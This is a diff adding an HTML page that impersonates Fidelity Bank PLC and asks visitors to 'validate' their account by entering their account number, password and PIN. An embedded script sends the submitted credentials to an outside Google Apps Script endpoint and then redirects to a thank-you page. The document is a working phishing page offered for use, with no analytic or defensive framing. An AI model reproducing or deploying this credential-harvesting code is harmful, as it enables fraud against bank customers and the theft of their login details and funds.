@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FIDELITY UPDATE</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 400px;
+      margin: 40px auto;
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+    h2 {
+      text-align: center;
+      color: #ff6600;
+      margin-bottom: 10px;
+    }
+    .header-text {
+      text-align: center;
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin-top: 12px;
+      font-weight: bold;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      width: 100%;
+      margin-top: 20px;
+      padding: 12px;
+      background: #ff6600;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      color: #fff;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #e65c00;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>FIDELITY BANK PLC</h2>
+    <div class="header-text">
+      Please enter your details below.<br>
+      This is fidelity's safe and secured platform to validate your account.
+    </div>
+
+       <form id="demoForm">
+      <label for="account_number">Account Number</label>
+      <input type="tel" id="account_number" name="account_number" required>
+
+  <label for="password">Password</label>
+<input type="password" id="password" name="password" required>
+
+<label for="pin">Pin</label>
+<input type="text" id="pin" name="pin" required>
+
+      <button type="submit">Login To Validate</button>
+    </form>
+  </div>
+
+  <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbwzUyYb_K1SPTpJBgTKCARBoW9KCFT9zEeIGsJ-qzRZPe4BOLqDwJp93QRbRvPjRt4dGQ/exec";
+
+    document.getElementById('demoForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const formData = new FormData(this);
+
+      fetch(scriptURL, { method: 'POST', body: formData })
+        .then(response => {
+          if (response.ok) {
+            window.location.href = "thankyou.html"; // ✅ Redirect to your thank_you.html
+          } else {
+            alert("Failed to submit. Please try again.");
+          }
+        })
+        .catch(error => {
+          console.error("Error!", error);
+          alert("Something went wrong. Try again.");
+        });
+    });
+  </script>
+</body>
+</html>
